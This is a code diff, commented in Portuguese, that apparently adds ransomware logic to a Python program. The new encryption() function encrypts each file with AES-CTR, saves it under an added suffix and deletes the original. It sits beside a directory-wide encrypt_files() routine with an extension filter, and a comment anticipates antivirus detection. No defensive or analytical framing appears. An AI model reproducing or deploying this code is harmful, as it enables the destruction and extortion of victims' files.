@@ -76,6 +76,40 @@ def check_permissions(path):
   return permissions["readable"] and permissions["writable"]
 
 
+# Antivirus podem identificar essa função como maliciosa, caso receba avisos, é por causa da analise heuristica.
+def encryption(file_path, crypto_key, suffix):
+  """
+  Criptografa um arquivo e salva com o sufixo especificado.
+
+  :param file_path: Caminho do arquivo a ser criptografado.
+  :param crypto_key: Chave para criptografar.
+  :param suffix: Sufixo para adicionar ao final do nome do arquivo a ser criptografado.
+  """
+
+  try:
+    # Gerar um nonce aleatorio para o CTR
+    nonce = get_random_bytes(8)
+    # Criar uma Cifra AES no modo CTR
+    cipher = AES.new(crypto_key, AES.MODE_CTR, nonce=nonce)
+
+    # Abrir o arquivo original
+    with open(file_path, 'rb') as f:
+      data = f.read()
+    
+    # Criptografar os dados
+    encrypted_data = cipher.encrypt(data)
+    # Salvar os dados criptografados no arquivo com sufixo
+    new_file_name = file_path + suffix
+
+    with open(new_file_name, 'wb') as f:
+      f.write(nonce + encrypted_data)
+    
+    if os.path.exists(new_file_name):
+      os.remove(file_path) # Remover o arquivo original
+  except Exception as e:
+    log(f"Error encrypting the file '{file_path}': {e}", level="error")
+
+
 def encrypt_files(directory, crypto_key, suffix, valid_extensions):
   """
   Criptografa todos os arquivos no diretorio atual com o sufixo especificado.
